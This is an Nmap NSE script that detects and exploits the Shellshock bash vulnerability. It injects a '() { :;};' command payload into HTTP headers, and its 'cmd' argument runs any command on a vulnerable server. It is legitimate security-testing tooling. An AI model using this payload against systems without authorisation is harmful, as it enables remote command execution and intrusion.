local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local rand = require "rand"

description = [[
Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and
CVE-2014-7169) in web applications.

To detect this vulnerability the script executes a command that prints a random
string and then attempts to find it inside the response body. Web apps that
don't print back information won't be detected with this method.

By default the script injects the payload in the HTTP headers User-Agent,
Cookie, and Referer.

Vulnerability originally discovered by Stephane Chazelas.

References:
* http://www.openwall.com/lists/oss-security/2014/09/24/10
* http://seclists.org/oss-sec/2014/q3/685
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
]]

---
-- @usage
-- nmap -sV -p- --script http-shellshock <target>
-- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-shellshock:
-- |   VULNERABLE:
-- |   HTTP Shellshock vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-6271
-- |       This web application might be affected by the vulnerability known as Shellshock. It seems the server
-- |       is executing commands injected via malicious HTTP headers.
-- |
-- |     Disclosure date: 2014-09-24
-- |     References:
-- |       http://www.openwall.com/lists/oss-security/2014/09/24/10
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
-- |       http://seclists.org/oss-sec/2014/q3/685
-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
--
-- @xmloutput
-- <elem key="title">HTTP Shellshock vulnerability</elem>
-- <elem key="state">VULNERABLE (Exploitable)</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2014-6271</elem>
-- </table>
-- <table key="description">
-- <elem>This web application might be affected by the vulnerability known as Shellshock. It seems the server
-- &#xa;is executing commands injected via malicious HTTP headers. &#xa;      </elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2014</elem>
-- <elem key="day">24</elem>
-- <elem key="month">09</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2014-09-24</elem>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169</elem>
-- <elem>http://www.openwall.com/lists/oss-security/2014/09/24/10</elem>
-- <elem>http://seclists.org/oss-sec/2014/q3/685</elem>
-- <elem>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</elem>
-- </table>
-- @args http-shellshock.uri URI. Default: /
-- @args http-shellshock.header HTTP header to use in requests. Default: User-Agent
-- @args http-shellshock.cmd Custom command to send inside payload. Default: nil
---
author = {"Paulino Calderon <calderon()websec.mx","Paul Amar <paul()sensepost com>"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

function generate_http_req(host, port, uri, custom_header, cmd)
  local rnd = nil
  --Set custom or probe with random string as cmd
  if not cmd then
    local rnd1 = rand.random_alpha(7)
    local rnd2 = rand.random_alpha(7)
    rnd = rnd1 .. rnd2
    cmd = ("echo; echo -n %s; echo %s"):format(rnd1, rnd2)
  end
  cmd = "() { :;}; " .. cmd
  -- Plant the payload in the HTTP headers
  local options = {header={}}
  options["no_cache"] = true
  if custom_header == nil then
    stdnse.debug1("Sending '%s' in HTTP headers:User-Agent,Cookie and Referer", cmd)
    options["header"]["User-Agent"] = cmd
    options["header"]["Referer"] = cmd
    options["header"]["Cookie"] = cmd
  else
    stdnse.debug1("Sending '%s' in HTTP header '%s'", cmd, custom_header)
    options["header"][custom_header] = cmd
  end
  local req = http.get(host, port, uri, options)

  return req, rnd
end

action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
  local http_header = stdnse.get_script_args(SCRIPT_NAME..".header") or nil
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
  local req, rnd = generate_http_req(host, port, uri, http_header, nil)
  if req.status == 200 and req.body:find(rnd, 1, true) then
    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = 'HTTP Shellshock vulnerability',
      state = vulns.STATE.NOT_VULN,
      description = [[
This web application might be affected by the vulnerability known
as Shellshock. It seems the server is executing commands injected
via malicious HTTP headers.
      ]],
      IDS = {CVE = 'CVE-2014-6271'},
      references = {
        'http://www.openwall.com/lists/oss-security/2014/09/24/10',
        'http://seclists.org/oss-sec/2014/q3/685',
        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169'
      },
      dates = {
        disclosure = {year = '2014', month = '09', day = '24'},
      },
    }
    stdnse.debug1("Random pattern '%s' was found in page. Host seems vulnerable.", rnd)
    vuln.state = vulns.STATE.EXPLOIT
    if cmd ~= nil then
       req = generate_http_req(host, port, uri, http_header, cmd)
       vuln.exploit_results = req.body
    end
    return vuln_report:make_output(vuln)
  end
end
